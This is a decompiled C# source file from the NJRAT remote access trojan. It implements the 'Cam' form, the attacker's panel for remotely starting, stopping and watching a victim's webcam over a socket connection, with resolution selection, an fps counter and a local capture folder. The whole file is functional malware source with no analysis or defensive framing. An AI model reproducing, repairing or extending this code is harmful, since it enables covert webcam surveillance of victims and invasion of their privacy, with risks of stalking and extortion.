using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200000D RID: 13
	[DesignerGenerated]
	public partial class Cam : Form
	{
		// Token: 0x060000F4 RID: 244 RVA: 0x0014EC84 File Offset: 0x0014D084
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Cam.__ENCList;
			lock (_ENCList)
			{
				bool flag = Cam.__ENCList.Count == Cam.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Cam.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Cam.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Cam.__ENCList[num] = Cam.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Cam.__ENCList.RemoveRange(num, Cam.__ENCList.Count - num);
					Cam.__ENCList.Capacity = Cam.__ENCList.Count;
				}
				Cam.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060000F7 RID: 247 RVA: 0x0014F424 File Offset: 0x0014D824
		// (set) Token: 0x060000F8 RID: 248 RVA: 0x0014F43C File Offset: 0x0014D83C
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060000F9 RID: 249 RVA: 0x0014F448 File Offset: 0x0014D848
		// (set) Token: 0x060000FA RID: 250 RVA: 0x0014F460 File Offset: 0x0014D860
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
				bool flag = this._ComboBox1 != null;
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged -= eventHandler;
				}
				this._ComboBox1 = value;
				flag = this._ComboBox1 != null;
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000FB RID: 251 RVA: 0x0014F4C0 File Offset: 0x0014D8C0
		// (set) Token: 0x060000FC RID: 252 RVA: 0x0014F4D8 File Offset: 0x0014D8D8
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= eventHandler;
				}
				this._CheckBox3 = value;
				flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060000FD RID: 253 RVA: 0x0014F538 File Offset: 0x0014D938
		// (set) Token: 0x060000FE RID: 254 RVA: 0x0014F550 File Offset: 0x0014D950
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060000FF RID: 255 RVA: 0x0014F5B0 File Offset: 0x0014D9B0
		// (set) Token: 0x06000100 RID: 256 RVA: 0x0014F5C8 File Offset: 0x0014D9C8
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ComboBox2_SelectedIndexChanged);
				bool flag = this._ComboBox2 != null;
				if (flag)
				{
					this._ComboBox2.SelectedIndexChanged -= eventHandler;
				}
				this._ComboBox2 = value;
				flag = this._ComboBox2 != null;
				if (flag)
				{
					this._ComboBox2.SelectedIndexChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x06000101 RID: 257 RVA: 0x0014F628 File Offset: 0x0014DA28
		// (set) Token: 0x06000102 RID: 258 RVA: 0x0014F640 File Offset: 0x0014DA40
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler paintEventHandler = new PaintEventHandler(this.PictureBox1_Paint);
				bool flag = this._PictureBox1 != null;
				if (flag)
				{
					this._PictureBox1.Paint -= paintEventHandler;
				}
				this._PictureBox1 = value;
				flag = this._PictureBox1 != null;
				if (flag)
				{
					this._PictureBox1.Paint += paintEventHandler;
				}
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x06000103 RID: 259 RVA: 0x0014F6A0 File Offset: 0x0014DAA0
		// (set) Token: 0x06000104 RID: 260 RVA: 0x0014F6B8 File Offset: 0x0014DAB8
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x06000105 RID: 261 RVA: 0x0014F6C4 File Offset: 0x0014DAC4
		// (set) Token: 0x06000106 RID: 262 RVA: 0x0014F6DC File Offset: 0x0014DADC
		internal virtual Timer vmethod_6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				bool flag = this._vmethod_6 != null;
				if (flag)
				{
					this._vmethod_6.Tick -= eventHandler;
				}
				this._vmethod_6 = value;
				flag = this._vmethod_6 != null;
				if (flag)
				{
					this._vmethod_6.Tick += eventHandler;
				}
			}
		}

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000107 RID: 263 RVA: 0x0014F73C File Offset: 0x0014DB3C
		// (set) Token: 0x06000108 RID: 264 RVA: 0x0014F754 File Offset: 0x0014DB54
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick_1);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= eventHandler;
				}
				this._Timer1 = value;
				flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick += eventHandler;
				}
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0014F7B4 File Offset: 0x0014DBB4
		public Cam()
		{
			base.FormClosing += this.Cam_FormClosing;
			base.Load += this.Cam_Load;
			Cam.__ENCAddToList(this);
			this.fps = 0;
			this.int_0 = 0;
			this.QQ = string.Empty;
			this.folder = string.Empty;
			this.InitializeComponent();
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0014F824 File Offset: 0x0014DC24
		private void Cam_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cn = this.sk.CN;
				if (cn)
				{
					this.sk.Send("@");
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0014F884 File Offset: 0x0014DC84
		private void Cam_Load(object sender, EventArgs e)
		{
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
				this.Text = this.QQ;
				this.ComboBox2.SelectedIndex = 3;
				this.vmethod_6.Enabled = true;
				this.folder = this.osk.Folder + "Cam\\";
				bool flag = !Directory.Exists(this.folder);
				if (flag)
				{
					Directory.CreateDirectory(this.folder);
				}
				try
				{
					this.ComboBox2.SelectedIndex = Class7.class8_0.int_0;
				}
				catch (Exception ex)
				{
					this.ComboBox2.SelectedIndex = 3;
				}
				flag = Class7.class8_0.bool_7;
				if (flag)
				{
					this.Button1.Text = "Stop";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						Class7.string_1,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						Class7.string_1,
						this.ComboBox2.Text
					}));
				}
			}
			catch (Exception ex2)
			{
				this.Close();
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0014FA24 File Offset: 0x0014DE24
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.vmethod_6.Enabled = false;
			bool flag;
			try
			{
				flag = (this.osk == null) | (this.sk == null);
				if (flag)
				{
					this.Close();
					return;
				}
				flag = !this.osk.CN | !this.sk.CN;
				if (flag)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.int_0 = this.fps;
			flag = this.int_0 == 0;
			if (flag)
			{
				this.pkt = 0;
				this.PictureBox1.Invalidate();
			}
			this.fps = 0;
			this.vmethod_6.Enabled = true;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0014FAF0 File Offset: 0x0014DEF0
		private void PictureBox1_Paint(object sender, PaintEventArgs e)
		{
			try
			{
				string text = Conversions.ToString(this.int_0) + "fps\r\n" + Class6.smethod_17((long)this.pkt);
				Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
				Rectangle rectangle = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(Brushes.Black, rectangle);
				Brush brush = Brushes.Red;
				bool flag = this.int_0 > 3;
				if (flag)
				{
					brush = Brushes.YellowGreen;
				}
				flag = this.int_0 > 6;
				if (flag)
				{
					brush = Brushes.LimeGreen;
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0014FBD8 File Offset: 0x0014DFD8
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
				if (flag)
				{
					this.Button1.Text = "Stop";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						Class7.string_1,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						Class7.string_1,
						this.ComboBox2.Text
					}));
				}
				else
				{
					this.Button1.Text = "Start";
					this.sk.Send("@");
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0014FCB8 File Offset: 0x0014E0B8
		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0014FD08 File Offset: 0x0014E108
		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				NewLateBinding.LateCall(this.sk, null, "Send", new object[] { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(this.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(this.ComboBox2.SelectedItem))) }, null, null, null, true);
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0014FD98 File Offset: 0x0014E198
		private void ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				NewLateBinding.LateCall(this.sk, null, "Send", new object[] { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(this.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(this.ComboBox2.SelectedItem))) }, null, null, null, true);
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0014FE28 File Offset: 0x0014E228
		private void Timer1_Tick_1(object sender, EventArgs e)
		{
			this.ProgressBar1.Value = this.sk.rp();
		}

		// Token: 0x04000070 RID: 112
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000072 RID: 114
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000073 RID: 115
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000074 RID: 116
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x04000075 RID: 117
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000076 RID: 118
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x04000077 RID: 119
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x04000078 RID: 120
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000079 RID: 121
		[AccessedThroughProperty("vmethod_6")]
		private Timer _vmethod_6;

		// Token: 0x0400007A RID: 122
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x0400007B RID: 123
		public string folder;

		// Token: 0x0400007C RID: 124
		public int fps;

		// Token: 0x0400007D RID: 125
		private int int_0;

		// Token: 0x0400007E RID: 126
		public Client osk;

		// Token: 0x0400007F RID: 127
		public int pkt;

		// Token: 0x04000080 RID: 128
		public string QQ;

		// Token: 0x04000081 RID: 129
		public Client sk;
	}
}
